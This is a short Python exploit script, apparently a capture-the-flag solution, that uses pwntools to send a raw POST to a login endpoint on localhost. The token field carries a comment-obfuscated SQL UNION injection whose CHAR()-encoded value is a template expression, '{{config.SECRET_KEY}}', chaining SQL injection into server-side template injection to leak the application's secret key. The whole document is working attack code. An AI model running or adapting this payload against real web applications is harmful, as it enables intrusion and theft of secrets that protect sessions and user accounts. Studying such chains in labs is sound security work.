import requests
from pwn import *

base_domain = "localhost"
base_port = "3002"

r = remote(base_domain, base_port)

cmd ="""{{config.SECRET_KEY}}"""

def gen_payload(cmd):
    res = ""
    for c in cmd:
        res += str(ord(c)) + ","
    return f"CHAR({res[:-1]})"

p = "username=a&password=a&token=0/**/UNION/**/VALUES(%s,1,1)/*" % gen_payload(cmd)


r.send(f"""POST /login HTTP/1.1
Host: {base_domain}:{base_port}
Content-Type: application/x-www-form-urlencoded
Content-Type: application/x-www-form-urlencoded
Content-Length: {len(p)}

{p}
""".replace("\r","\r\n").encode())

res = r.recv(2048).split(b"\r\n\r\n")[-1]

print("[+] Getting response: \n")
print(res.decode())
